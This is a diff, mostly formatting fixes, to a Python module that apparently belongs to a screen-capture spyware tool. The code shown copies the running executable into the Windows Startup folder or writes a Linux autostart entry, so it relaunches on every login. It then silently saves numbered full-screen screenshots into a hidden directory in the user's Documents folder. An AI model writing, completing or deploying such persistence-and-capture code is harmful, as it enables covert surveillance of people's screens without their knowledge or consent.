@@ -3,7 +3,7 @@ import shutil
 import sys
 from typing import Optional
 
-import PIL as ImageGrab
+from PIL import ImageGrab
 from constants import (
     AUTOSTART_CONTENT,
     AUTOSTART_DIR,
@@ -25,7 +25,7 @@ def is_windows() -> bool:
     Returns:
         - (bool): True if the current operating system is Windows, False otherwise.
     """
-    return os.name == 'nt'
+    return os.name == "nt"
 
 
 def create_autostart_entry():
@@ -50,24 +50,30 @@ def create_autostart_entry_win():
     if aup and up:
         script_folder = os.path.dirname(os.path.abspath(sys.argv[0]))
         source_path = os.path.join(script_folder, sys.executable)
-        destination_path = os.path.join(up, "AppData", "Roaming", "Microsoft",
-                                        "Windows", "Start Menu", "Programs",
-                                        "Startup", DUPLICATE_NAME_FILE)
+        destination_path = os.path.join(
+            up,
+            "AppData",
+            "Roaming",
+            "Microsoft",
+            "Windows",
+            "Start Menu",
+            "Programs",
+            "Startup",
+            DUPLICATE_NAME_FILE,
+        )
 
         # Check if the file is already in the startup folder
         if not os.path.exists(destination_path):
             shutil.copy2(
-                source_path,
-                destination_path)  # Preserves the original file metadata.
+                source_path, destination_path
+            )  # Preserves the original file metadata.
             if VERBOSE:
                 print(
                     f"File '{DUPLICATE_NAME_FILE}' moved to startup folder successfully."
                 )
         else:
             if VERBOSE:
-                print(
-                    f"File '{DUPLICATE_NAME_FILE}' is already in the startup folder."
-                )
+                print(f"File '{DUPLICATE_NAME_FILE}' is already in the startup folder.")
     else:
         if VERBOSE:
             print("Oops, couldn't look up stuff in os.environ")
@@ -94,19 +100,18 @@ def create_autostart_entry_linux():
     if not os.path.exists(autostart_path):
         os.makedirs(autostart_path)
 
-    desktop_entry_path = os.path.join(autostart_path,
-                                      f'{DUPLICATE_NAME_FILE}.desktop')
+    desktop_entry_path = os.path.join(autostart_path, f"{DUPLICATE_NAME_FILE}.desktop")
 
     # Check if the desktop entry file already exists
     if not os.path.exists(desktop_entry_path):
-        with open(desktop_entry_path, 'w') as desktop_entry_file:
+        with open(desktop_entry_path, "w") as desktop_entry_file:
             desktop_entry_file.write(AUTOSTART_CONTENT)
 
         if VERBOSE:
-            print(f'Autostart entry created at: {desktop_entry_path}')
+            print(f"Autostart entry created at: {desktop_entry_path}")
     else:
         if VERBOSE:
-            print(f'Autostart entry already exists at: {desktop_entry_path}')
+            print(f"Autostart entry already exists at: {desktop_entry_path}")
 
 
 def take_screenshot() -> Optional[bool]:
@@ -121,7 +126,7 @@ def take_screenshot() -> Optional[bool]:
         img_dir = IMG_DIR
         if is_windows():
             # Get the path to the user's "Documents" directory
-            documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')
+            documents_dir = os.path.join(os.path.expanduser("~"), "Documents")
 
             # Define the name of the hidden directory
             hidden_dir_name = IMG_DIR
@@ -136,16 +141,17 @@ def take_screenshot() -> Optional[bool]:
 
         image_number = 1
         while os.path.isfile(
-                os.path.join(img_dir,
-                             '{}{}.png'.format(IMG_FILE, image_number))):
+            os.path.join(img_dir, "{}{}.png".format(IMG_FILE, image_number))
+        ):
             image_number += 1
 
         im = ImageGrab.grab()
 
         if im is not None:
             image_name = os.path.join(
-                img_dir, '{}{}.png'.format(IMG_FILE, image_number))
-            im.save(image_name, 'png')
+                img_dir, "{}{}.png".format(IMG_FILE, image_number)
+            )
+            im.save(image_name, "png")
             if VERBOSE:
                 print("Image saved successfully at:", image_name)
             return im
